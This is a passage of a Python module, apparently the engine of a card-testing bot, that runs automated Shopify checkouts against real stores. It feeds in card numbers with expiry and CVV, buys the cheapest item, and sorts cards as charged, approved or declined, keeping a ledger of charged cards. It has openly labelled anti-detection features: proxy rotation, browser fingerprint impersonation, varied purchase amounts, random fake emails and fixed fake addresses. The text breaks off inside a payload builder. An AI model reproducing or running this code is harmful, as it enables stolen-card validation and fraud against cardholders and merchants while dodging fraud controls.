# =============================================================================
# checkout_engine.py — Shopify Checkout Engine (v5.0.0 Unified)
# =============================================================================
# Merges every smart trick from:
#   - previous checkout_engine.py      (ledger, LRU bin, retry, is_proxy_alive)
#   - autto (7).py                     (curl_cffi + browser fingerprint rotation)
#   - autto (6).py                     (products.json retry on 429/5xx)
#   - autoshopify@aiojames (1).py      (tax-change retry loop)
#   - Autoshopify (5).py               (_shuffle_pick_variant anti-detection)
#   - Autoshopify.py                   (dynamic vault URL extraction)
#
# Public API (bot.py imports these — do not rename):
#   run_checkout_for_card(shop_url, card_entry, proxy_url, low) -> CheckResult
#   run_checkout_public(shop_url, card, proxy_url, low)         -> dict
#   run_checkout_async(shop_url, card, proxy_url, low)          -> dict
#   is_proxy_alive(proxy_url, timeout)                          -> bool
#   normalize_proxy(raw)                                        -> str
#   parse_card_entry(entry)                                     -> (num, mm, yyyy, cvv)
#   engine_stats()                                              -> dict
#   set_hit_callback(fn)
# =============================================================================

import asyncio
import hashlib
import html
import json
import os
import random
import re
import string
import threading
import time
import urllib.parse
from collections import OrderedDict
from dataclasses import asdict, dataclass, field
from datetime import datetime
from enum import Enum
from typing import Callable, Dict, List, Optional, Tuple

from curl_cffi import requests as cffi_requests
from curl_cffi.requests import Session

import logging
logger = logging.getLogger("checkout")
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(_h)
    logger.setLevel(logging.INFO)

VERSION = "5.0.0"

# ──────────────────────── result types (unchanged) ─────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = "USD"
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False
    duration_ms: int = 0
    from_ledger: bool = False
    stage_timings: Dict[str, int] = field(default_factory=dict)

# ──────────────────────── charged-card ledger ──────────────────────────

CHARGED_LEDGER_FILE = os.environ.get("CHARGED_LEDGER_FILE", ".charged_cards.json")
_LEDGER_LOCK  = threading.Lock()
_LEDGER_CACHE: Optional[Dict[str, dict]] = None
_LEDGER_TTL   = 86400

def _ledger_load() -> Dict[str, dict]:
    global _LEDGER_CACHE
    with _LEDGER_LOCK:
        if _LEDGER_CACHE is not None:
            return _LEDGER_CACHE
        try:
            if os.path.exists(CHARGED_LEDGER_FILE):
                with open(CHARGED_LEDGER_FILE, "r", encoding="utf-8") as f:
                    _LEDGER_CACHE = json.load(f) or {}
            else:
                _LEDGER_CACHE = {}
        except Exception:
            _LEDGER_CACHE = {}
        return _LEDGER_CACHE

def _ledger_save():
    with _LEDGER_LOCK:
        try:
            with open(CHARGED_LEDGER_FILE, "w", encoding="utf-8") as f:
                json.dump(_LEDGER_CACHE or {}, f, indent=2)
        except Exception:
            pass

def _card_fp(card_entry: str) -> str:
    try:
        parts = card_entry.split("|")
        pan = re.sub(r"\D", "", parts[0])
        mm = str(parts[1]).zfill(2)
        yyyy = str(parts[2])
        return hashlib.sha256(f"{pan}|{mm}|{yyyy}".encode()).hexdigest()[:24]
    except Exception:
        return hashlib.sha256(card_entry.encode()).hexdigest()[:24]

def ledger_lookup(card_entry: str) -> Optional[dict]:
    key = _card_fp(card_entry)
    data = _ledger_load()
    entry = data.get(key)
    if not entry: return None
    if time.time() - entry.get("charged_at", 0) > _LEDGER_TTL:
        return None
    return entry

def ledger_record(card_entry: str, amount: str, currency: str, site: str, receipt_url: str = ""):
    key = _card_fp(card_entry)
    data = _ledger_load()
    data[key] = {
        "charged_at": time.time(),
        "amount": amount, "currency": currency or "USD",
        "site": site, "receipt_url": receipt_url,
        "card_last4": card_entry.split("|")[0][-4:] if "|" in card_entry else "????",
    }
    _ledger_save()

def ledger_stats() -> dict:
    data = _ledger_load()
    now = time.time()
    live = sum(1 for e in data.values() if now - e.get("charged_at", 0) <= _LEDGER_TTL)
    return {"total": len(data), "live": live, "file": CHARGED_LEDGER_FILE}

def ledger_clear():
    global _LEDGER_CACHE
    with _LEDGER_LOCK:
        _LEDGER_CACHE = {}
    try:
        if os.path.exists(CHARGED_LEDGER_FILE):
            os.remove(CHARGED_LEDGER_FILE)
    except Exception:
        pass

# ──────────────────────── bin cache (LRU 2000) ─────────────────────────

_BIN_CACHE: "OrderedDict[str, Tuple[float, dict]]" = OrderedDict()
_BIN_LOCK  = threading.Lock()
_BIN_TTL   = 86400
_BIN_MAX   = 2000

def _bin_get(k):
    with _BIN_LOCK:
        e = _BIN_CACHE.get(k)
        if not e: return None
        ts, v = e
        if time.time() - ts > _BIN_TTL:
            _BIN_CACHE.pop(k, None); return None
        _BIN_CACHE.move_to_end(k); return v

def _bin_put(k, v):
    with _BIN_LOCK:
        _BIN_CACHE[k] = (time.time(), v)
        _BIN_CACHE.move_to_end(k)
        while len(_BIN_CACHE) > _BIN_MAX:
            _BIN_CACHE.popitem(last=False)

def get_bin_info(bin_prefix: str) -> dict:
    bin6 = (bin_prefix or "")[:6]
    if len(bin6) < 6 or not bin6.isdigit():
        return {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"","cached":False}
    cached = _bin_get(bin6)
    if cached:
        cached["cached"] = True
        return cached
    result = {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"","cached":False}
    try:
        with Session(impersonate="chrome124", timeout=10) as s:
            r = s.get(f"https://lookup.binlist.net/{bin6}", headers={"Accept-Version":"3"})
            if r.status_code == 200:
                data = r.json()
                result["brand"]   = (data.get("scheme") or "-").upper()
                result["type"]    = (data.get("type") or "-").upper()
                result["level"]   = (data.get("brand") or "-").upper()
                result["bank"]    = ((data.get("bank") or {}).get("name") or "-")
                result["country"] = ((data.get("country") or {}).get("name") or "-")
                result["flag"]    = ((data.get("country") or {}).get("emoji") or "")
    except Exception:
        pass
    _bin_put(bin6, result)
    return result

# ──────────────────────── proxy helpers ────────────────────────────────

_PROXY_HEALTH: Dict[str, float] = {}
_PROXY_LOCK  = threading.Lock()
_TTL_LIVE = 300
_TTL_DEAD = 60

def normalize_proxy(raw: str) -> str:
    if not raw or not raw.strip():
        raise Exception("empty proxy")
    p = raw.strip()
    for prefix in ("/addproxy", "addproxy", "/proxy", "proxy"):
        if p.lower().startswith(prefix + " "):
            p = p[len(prefix):].strip(); break
        if p.lower() == prefix:
            raise Exception("empty proxy (command only)")
    p = p.split()[0] if p else ""
    if not p: raise Exception("empty proxy")
    if "://" in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.hostname or not parsed.port:
            raise Exception(f"invalid proxy: {raw!r}")
        return p
    if "@" in p:
        return "http://" + p
    parts = p.split(":")
    if len(parts) == 2:
        h, port = parts
        if not h or not port.isdigit(): raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{h}:{port}"
    if len(parts) == 4:
        h, port, u, pw = parts
        if not h or not port.isdigit(): raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{u}:{pw}@{h}:{port}"
    raise Exception(f"unsupported proxy format: {raw!r}")

def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    if not proxy_url:
        return True
    now = time.time()
    with _PROXY_LOCK:
        cached = _PROXY_HEALTH.get(proxy_url)
        if cached is not None:
            age = abs(now - abs(cached))
            ttl = _TTL_LIVE if cached > 0 else _TTL_DEAD
            if age < ttl:
                return cached > 0
    alive = False
    try:
        with Session(proxy=proxy_url, impersonate="chrome124", timeout=timeout) as s:
            r = s.head("https://cdn.shopify.com/", timeout=timeout)
            alive = 200 <= r.status_code < 500
    except Exception:
        pass
    with _PROXY_LOCK:
        _PROXY_HEALTH[proxy_url] = now if alive else -now
    return alive

# ──────────────────────── card parsing ─────────────────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    parts = card_entry.strip().split("|")
    if len(parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        mm = int(parts[1]); yyyy = int(parts[2])
    except ValueError as e:
        raise Exception(f"invalid month/year: {e}")
    return parts[0], mm, yyyy, parts[3]

def validate_card_luhn(number: str) -> bool:
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
    except ValueError:
        return False
    if len(digits) < 12: return False
    checksum = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9: d -= 9
        checksum += d
    return checksum % 10 == 0

# ──────────────────────── browser fingerprint rotation ────────────────

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "edge101", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ──────────────────────── address book ─────────────────────────────────

@dataclass
class Address:
    first_name: str; last_name: str
    address1: str; address2: str
    city: str; country_code: str; zone_code: str
    postal_code: str; phone: str
    email_domain: str = "gmail.com"

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james","anderson","428 W 45th St","Apt 4B","New York","US","NY","10036","+12125550100"),
    "CA": Address("john","smith","200 Kent St","","Ottawa","CA","ON","K1A 0G9","+16135550100"),
    "GB": Address("james","wilson","10 Downing St","","London","GB","ENG","SW1A 2AA","+442012345678"),
    "AU": Address("thomas","taylor","1 George St","","Sydney","AU","NSW","2000","+61212345678"),
    "DE": Address("lucas","thomas","Friedrichstr 100","","Berlin","DE","BE","10117","+493012345678"),
    "FR": Address("hugo","bernard","10 Rue de Rivoli","","Paris","FR","IDF","75001","+33112345678"),
    "NZ": Address("jack","wilson","1 Queen St","","Auckland","NZ","AUK","1010","+6491234567"),
    "IE": Address("sean","murphy","1 Grafton St","","Dublin","IE","D","D02 Y006","+35311234567"),
    "NL": Address("bas","jansen","Dam 1","","Amsterdam","NL","NH","1012 JS","+31201234567"),
    "ES": Address("carlos","garcia","Calle Mayor 1","","Madrid","ES","M","28013","+34912345678"),
    "IT": Address("marco","rossi","Via Roma 1","","Rome","IT","RM","00184","+39061234567"),
    "SE": Address("erik","andersson","Vasagatan 1","","Stockholm","SE","AB","111 20","+468123456"),
    "NO": Address("olav","hansen","Karl Johans gate 1","","Oslo","NO","03","0154","+4721234567"),
    "DK": Address("lars","nielsen","Strøget 1","","Copenhagen","DK","84","1457","+4531234567"),
    "FI": Address("jussi","korhonen","Mannerheimintie 1","","Helsinki","FI","18","00100","+35891234567"),
    "BE": Address("jan","peeters","Grote Markt 1","","Brussels","BE","BRU","1000","+3221234567"),
    "CH": Address("hans","weber","Bahnhofstrasse 1","","Zurich","CH","ZH","8001","+41441234567"),
    "AT": Address("markus","gruber","Stephansplatz 1","","Vienna","AT","9","1010","+4312345678"),
    "JP": Address("takashi","yamamoto","1-1-1 Marunouchi","","Tokyo","JP","13","100-0005","+81312345678"),
    "SG": Address("wei","tan","1 Raffles Place","#01-01","Singapore","SG","01","048616","+6561234567"),
    "AE": Address("ahmed","al-mansouri","Sheikh Zayed Road 1","","Dubai","AE","DU","12345","+97141234567"),
}

SHIPPING_FALLBACK_ORDER = ["CA","GB","AU","DE","FR","NL","IE","SE","NO","DK"]

EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
FIRST_NAMES   = ["james","john","robert","michael","william","david","mary","patricia","jennifer","linda"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez"]

def generate_random_email() -> str:
    return f"{random.choice(FIRST_NAMES)}{random.choice(LAST_NAMES)}{random.randint(1,999)}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES: return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    return COUNTRY_ADDRESSES.get(base, COUNTRY_ADDRESSES["US"])

def get_fallback_addresses(exclude: str = "US") -> List[Address]:
    return [COUNTRY_ADDRESSES[c] for c in SHIPPING_FALLBACK_ORDER if c.upper() != exclude.upper() and c in COUNTRY_ADDRESSES]

# ──────────────────────── per-domain recent-price cache ───────────────

_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()

def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent] or candidates
        pick = random.choice(preferred)
        _recent_prices[domain] = (list(recent) + [pick["price"]])[-5:]
    return pick

# ──────────────────────── TLS client (curl_cffi) ──────────────────────

class TLSClient:
    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout   = timeout
        self.proxy_url = proxy_url or ""
        self.impersonate = impersonate or random.choice(BROWSER_PROFILES)
        self.user_agent  = user_agent or random.choice(USER_AGENTS)
        _kw = {"impersonate": self.impersonate, "timeout": timeout}
        if self.proxy_url:
            _kw["proxy"] = self.proxy_url
        self.session = Session(**_kw)
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        })

    def get(self, url, **kw):
        kw.setdefault("timeout", self.timeout); return self.session.get(url, **kw)
    def post(self, url, data=None, json=None, **kw):
        kw.setdefault("timeout", self.timeout); return self.session.post(url, data=data, json=json, **kw)
    def close(self):
        try: self.session.close()
        except Exception: pass
    def __enter__(self): return self
    def __exit__(self, *a): self.close()


# =============================================================================
# STEP 0 — product discovery
# =============================================================================

def find_cheapest_product(client: TLSClient, shop_url: str, low: bool = True,
                          min_price: float = 0.50, max_price: float = 5.00
                          ) -> Tuple[str, str, str, str]:
    """
    Retries on 429/5xx like autto(6). Uses _shuffle_pick_variant to vary
    price per call per-domain (anti-detection). Falls back to overall
    cheapest if nothing in-range.
    """
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {400, 429, 500, 502, 503, 504}
    effective_max = max_price if low else float("inf")

    resp = None
    last_err: Optional[Exception] = None
    for attempt in range(1, 4):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.debug(f"products.json attempt {attempt}/3 net: {exc!r}")
            if attempt < 3:
                time.sleep(2 + random.random() * 2)
            continue
        if resp.status_code == 200:
            break
        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            if attempt < 3:
                time.sleep(2 + random.random() * 2)
            continue
        raise Exception(f"products.json HTTP {resp.status_code}")
    else:
        raise Exception(f"products.json failed after 3 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")

    try:
        products = resp.json().get("products", [])
    except Exception as e:
        raise Exception(f"products.json not json: {e}")

    if not products:
        raise Exception("no products")

    in_range: List[Dict] = []
    fallback: List[Dict] = []

    for p in products:
        for v in p.get("variants", []) or []:
            if v.get("available") is False: continue
            iq = v.get("inventory_quantity")
            if iq is not None and iq <= 0: continue
            try:
                pf = float(v.get("price") or 0)
            except (TypeError, ValueError):
                continue
            if pf < min_price: continue
            entry = {
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title": p.get("title", ""),
                "price": v.get("price", ""),
                "price_f": pf,
            }
            if pf <= effective_max: in_range.append(entry)
            fallback.append(entry)

    fallback.sort(key=lambda x: x["price_f"])
    candidates = in_range if in_range else fallback
    if not candidates:
        raise Exception(f"no available products above ${min_price:.2f}")

    pick = _shuffle_pick_variant(candidates, domain)
    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"]

# ──────────────────────── step 1: cart → checkout ──────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str
                             ) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control": "no-cache", "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    })
    if resp.status_code not in (200, 302):
        raise Exception(f"cart permalink HTTP {resp.status_code}")

    checkout_url  = resp.url
    checkout_html = resp.text
    m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
    checkout_token = m.group(1) if m else ""

    session_match = re.search(
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── step 2: private access token ────────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    u = html.unescape(checkout_html)
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', u)
    return m.group(1) if m else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str):
    req = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    try:
        client.get(req, headers={"accept": "*/*", "referer": checkout_url})
    except Exception:
        pass

# ──────────────────────── step 3: actions JS → IDs ────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_.\-]+\.js)', checkout_html)
    return shop_url + m.group(1) if m else ""

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    resp = client.get(actions_url, headers={
        "accept": "*/*",
        "origin": shop_url,
        "referer": shop_url + "/",
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    })
    if resp.status_code != 200:
        raise Exception(f"actions JS HTTP {resp.status_code}")
    return resp.text

def _gql_id(js: str, name: str, typ: str) -> str:
    m = re.search(rf'id:\s*"([a-f0-9]{{64}})"\s*,\s*type:\s*"{typ}"\s*,\s*name:\s*"{name}"', js)
    return m.group(1) if m else ""

def _gql_id_flex(js: str, name: str) -> str:
    pats = [
        rf'id:\s*"([a-f0-9]{{64}})"\s*,\s*type:\s*"(query|mutation)"\s*,\s*name:\s*"{name}"',
        rf'name:\s*"{name}"\s*,\s*type:\s*"(query|mutation)"\s*,\s*id:\s*"([a-f0-9]{{64}})"',
        rf'"{name}"[^}}]{{0,200}}id:\s*"([a-f0-9]{{64}})"',
        rf'{name}.{{0,300}}?([a-f0-9]{{64}})',
    ]
    for p in pats:
        m = re.search(p, js)
        if m:
            for g in m.groups():
                if g and len(g) == 64 and all(c in string.hexdigits for c in g):
                    return g
    return ""

def extract_proposal_id(js):        return _gql_id(js, "Proposal", "query")
def extract_submit_id(js):          return _gql_id(js, "SubmitForCompletion", "mutation")
def extract_poll_id(js):            return _gql_id_flex(js, "PollForReceipt")

# ──────────────────────── token / meta extractors ─────────────────────

def extract_stable_id(h):
    u = html.unescape(h)
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', u)
    return m.group(1) if m else ""

def extract_commit_sha(h):
    u = html.unescape(h)
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', u)
    return m.group(1) if m else ""

def extract_source_token(h):
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', h)
    return html.unescape(m.group(1)).strip('"') if m else ""

def extract_ident_signature(h):
    d = h.replace('&quot;', '"')
    for p in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(p, d)
        if m: return m.group(1)
    return ""

def extract_vault_url(h):
    d = h.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', d)
    if m: return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', d)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""

def extract_vault_domain(h):
    d = h.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', d)
    return m.group(1) if m else ""

# ──────────────────────── JSON helpers ─────────────────────────────────

def _jget(d, *path, default=None):
    cur = d
    for k in path:
        if not isinstance(cur, dict): return default
        cur = cur.get(k)
        if cur is None: return default
    return cur

def extract_queue_token(js: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', js)
    return m.group(1) if m else ""

def extract_seller(js: str) -> dict:
    try:
        return _jget(json.loads(js), "data","session","negotiate","result","sellerProposal", default={}) or {}
    except Exception:
        return {}

def extract_seller_currency(js: str) -> str:
    seller = extract_seller(js)
    c = seller.get("supportedCurrencies") or []
    return c[0] if isinstance(c, list) and c else ""

def extract_seller_country(js: str) -> str:
    seller = extract_seller(js)
    c = seller.get("supportedCountries") or []
    return c[0] if isinstance(c, list) and c else ""

def extract_running_total(js: str) -> str:
    seller = extract_seller(js)
    return str(_jget(seller, "runningTotal","value","amount", default=""))

def extract_delivery_handle(js: str) -> str:
    seller = extract_seller(js)
    dlv = seller.get("delivery") or {}
    if dlv.get("__typename") == "FilledDeliveryTerms":
        lines = dlv.get("deliveryLines") or [{}]
        strategies = (lines[0] or {}).get("availableDeliveryStrategies") or []
        if strategies:
            return strategies[0].get("handle","") or ""
    h = _jget(dlv, "selectedDeliveryStrategy","handle", default="")
    if h: return h
    h = dlv.get("deliveryStrategyHandle","")
    if h: return h
    for line in dlv.get("deliveryLines") or []:
        for macro in line.get("deliveryMacros") or []:
            handles = macro.get("deliveryStrategyHandles") or []
            if handles: return handles[0]
    for p in [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]:
        m = re.search(p, js)
        if m: return m.group(1)
    return ""

def extract_shipping_amount(js: str) -> str:
    seller = extract_seller(js)
    dlv = seller.get("delivery") or {}
    lines = dlv.get("deliveryLines") or []
    if lines:
        strategies = lines[0].get("availableDeliveryStrategies") or []
        if strategies:
            amt = _jget(strategies[0], "amount","value","amount", default="")
            if amt: return str(amt)
    m = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        js)
    return m.group(1) if m else ""

def extract_tax_amount(js: str) -> str:
    seller = extract_seller(js)
    tax = seller.get("tax") or {}
    if tax.get("__typename") == "FilledTaxTerms":
        v = _jget(tax, "totalTaxAmount","value","amount", default="0.0")
        if v is not None: return str(v)
    return "0.0"

def extract_signed_handles(js: str) -> List[str]:
    handles: List[str] = []
    seller = extract_seller(js)
    de = seller.get("deliveryExpectations") or {}
    exp_list = de.get("deliveryExpectations") or []
    if isinstance(exp_list, list):
        for x in exp_list:
            h = x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
            if h: handles.append(h)
    return handles

def extract_checkout_total(js: str) -> str:
    seller = extract_seller(js)
    for key in ("checkoutTotal","total","runningTotal"):
        v = _jget(seller, key, "value", "amount", default="")
        if v: return str(v)
    return ""

def extract_payment_method_id(js: str) -> str:
    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', js)
    return m.group(1) if m else ""

def extract_any_error(body: str) -> str:
    for p in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(p, body)
        if m: return m.group(1)
    return ""

def extract_receipt_id(body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', body)
    return m.group(1) if m else ""

def extract_receipt_session(body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""

# ──────────────────────── payload builders ─────────────────────────────

def _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token) -> Dict:
    h = {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "x-checkout-one-session-token": session_token,
    }
    if build_id:
        h["x-checkout-web-build-id"]        = build_id
        h["x-checkout-web-deploy-stage"]    = "production"
        h["x-checkout-web-server-handling"] = "fast"
        h["x-checkout-web-server-rendering"] = "yes"
    if source_token:
        h["x-checkout-web-source-id"] = source_token
    return h

def _addr_partial(addr: Address) -> Dict:
    return {"partialStreetAddress": {
        "address1": addr.address1, "address2": addr.address2,
        "city": addr.city, "countryCode": addr.country_code,
        "postalCode": addr.postal_code,
        "firstName": addr.first_name, "lastName": addr.last_name,
        "zoneCode": addr.zone_code, "phone": addr.phone,
        "oneTimeUse": False,
    }}

def _addr_street(addr: Address) -> Dict:
    return {"streetAddress": {
        "address1": addr.address1, "address2": addr.address2,
        "city": addr.city, "countryCode": addr.country_code,
        "postalCode": addr.postal_code,
        "firstName": addr.first_name, "lastName": addr.last_name,
        "zoneCode": addr.zone_code, "phone": addr.phone,
    }}

def _buyer_identity(currency, country, email, addr: Address) -> Dict:
    return {
        "customer": {"presentmentCurrency": currency, "countryCode": country},
        "email": email,
        "emailChanged": False,
        "phoneCountryCode": country,
        "marketingConsent": [{"email": {"value": email}}],
        "shopPayOptInPhone": {"countryCode": country, "number": addr.phone},
        "rememberMe": False,
    }

def _build_proposal_vars(
    session_token, queue_token, stable_id, variant_id, merch_id,
    currency, country, subtotal, email, addr: Address,
    delivery_handle=None, shipping_amount=None, tax_amount=None,
    signed_handles=None,
) -> Dict:
    if delivery_handle:
        delivery_lines = [{
            "destination": _addr_partial(addr),
            "selectedDeliveryStrategy": {
                "deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False},
                "options": {},
            },
            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {"value": {"amount": str(shipping_amount or 0), "currencyCode": currency}},
            "destinationChanged": False,
        }]
    else:
        delivery_lines = [{
            "destination": _addr_partial(addr),
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True},
                },
                "options": {},
            },
            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True,
        }]

    return {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token or "",
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": delivery_lines,
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        },
        "deliveryExpectations": {
            "deliveryExpectationLines": [{"signedHandle": h} for h in (signed_handles or [])]
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id": f"gid://shopify/ProductVariantMerchandise/{merch_id}",
                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                }},
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                "lineComponentsSource": None,
                "lineComponents": [],
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True},
            "paymentLines": [],
            "billingAddress": _addr_street(addr),
        },
        "buyerIdentity": _buyer_identity(currency, country, email, addr),
        "tip": {"tipLines": []},
        "poNumber": None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {"value": {"amount": str(tax_amount or "0.0"), "currencyCode": currency}},
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
